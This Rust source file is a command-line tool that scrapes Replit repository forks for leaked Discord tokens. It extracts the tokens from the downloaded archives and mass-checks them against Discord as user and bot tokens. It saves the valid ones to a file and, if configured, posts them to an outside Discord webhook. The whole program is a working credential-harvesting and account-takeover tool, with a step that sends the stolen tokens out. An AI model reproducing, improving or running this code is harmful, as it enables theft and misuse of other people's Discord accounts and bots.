use discord_api::{Discord, Webhook};
use repl_api::ReplAPI;
use ascii::{cli, options};
use util::{search_extract, write_file, fetch_lines};
use tokio::main;
use std::io::{stdin, stdout, Write};
use serde::Deserialize;
use serde_json::from_str;
use std::fs;


#[derive(Debug, Deserialize)]
struct Config {
    webhook: Option<String>
}


#[main()]
async fn main() {
    cli();
    loop {

        options();
        print!("\x1b[0;92mPlease enter an Option: [>]\x1b[0m ");
        stdout().flush().unwrap();
        let mut option = String::new();
        stdin()
            .read_line(&mut option)
            .expect("Failed to read line");
        let option = option.trim().parse::<u32>();

        match option {
            Ok(option) => {
            match option {
                1 => {
                    let mut url = String::new();
                    print!("\x1b[0;92mExample URL: /@someone/repo\nPlease enter a URL to scrape: [>]\x1b[0m ");
                    stdout().flush().unwrap();
                    stdin()
                        .read_line(&mut url)
                        .expect("Failed to read line");

                    let mut max = String::new();
                    print!("\x1b[0;92mPlease enter an amount to scrape: [>]\x1b[0m ");
                    stdout().flush().unwrap();
                    stdin()
                        .read_line(&mut max)
                        .expect("Failed to read line");

                    let max = max.trim().parse::<u32>().unwrap();

                    scrape_url(url.trim(), max).await;
                },
                2 => check_tokens().await,

                _ => continue
            }
            },
            Err(_) => continue
        }
    }

}

async fn check_tokens() {
    let tokens = fetch_lines("./false_tokens.txt");
    let disc = Discord::new(tokens.clone());
    let valid_users = disc.mass_check_user().await;
    println!("\x1b[0;34m
   ╔════════════════════════╬
   ║ Valid User Tokens: {}
   ║ Total invalid: {}
   ╚════════════════════════╬
   \x1b[0m", &valid_users.len(), &tokens.len() - &valid_users.len());
    let valid_bots = disc.mass_check_bot().await;
    println!("\x1b[0;34m
   ╔════════════════════════╬
   ║ Valid Bot Tokens: {}
   ║ Total invalid: {}
   ╚════════════════════════╬
   \x1b[0m", &valid_bots.len(), &tokens.len() - &valid_bots.len());
    write_file("valid.txt", "User Tokens:\n\n").await;
    for token in valid_users.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    write_file("valid.txt", "Bot Tokens:\n\n").await;
    for token in valid_bots.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
    if let Ok(config) = config {
        if let Some(webhook) = config.webhook {
            let web = Webhook::new(&webhook);
            web.send("None", "User", valid_users).await;
            web.send("None", "Bot", valid_bots).await;
        }
    }
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await
}

async fn scrape_url(url: &str, count: u32) {
    let repl = ReplAPI{};
    let data = repl.fetch_forks_url(url.clone(), count).await;
    let mut tokens = vec![];
    let mut count = 0;
    for zip in data {
        count += 1;
        let mut token = search_extract(zip, count).await;
        tokens.append(&mut token);
    }
    for token in tokens.clone() {
        write_file("false_tokens.txt", &format!("{token}\n")).await;
    }
    let disc = Discord::new(tokens.clone());
    let valid_users = disc.mass_check_user().await;
    println!("\x1b[0;34m
   ╔════════════════════════╬
   ║ Valid User Tokens: {}
   ║ Total invalid: {}
   ╚════════════════════════╬
   \x1b[0m", &valid_users.len(), &tokens.len() - &valid_users.len());
    let valid_bots = disc.mass_check_bot().await;
    println!("\x1b[0;34m
   ╔════════════════════════╬
   ║ Valid Bot Tokens: {}
   ║ Total invalid: {}
   ╚════════════════════════╬
   \x1b[0m", &valid_bots.len(), &tokens.len() - &valid_bots.len());
    write_file("valid.txt", "User Tokens:\n\n").await;
    for token in valid_users.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    write_file("valid.txt", "Bot Tokens:\n\n").await;
    for token in valid_bots.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
    if let Ok(config) = config {
        if let Some(webhook) = config.webhook {
            let web = Webhook::new(&webhook);
            web.send(url, "User", valid_users).await;
            web.send(url, "Bot", valid_bots).await;
        }
    }
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await
}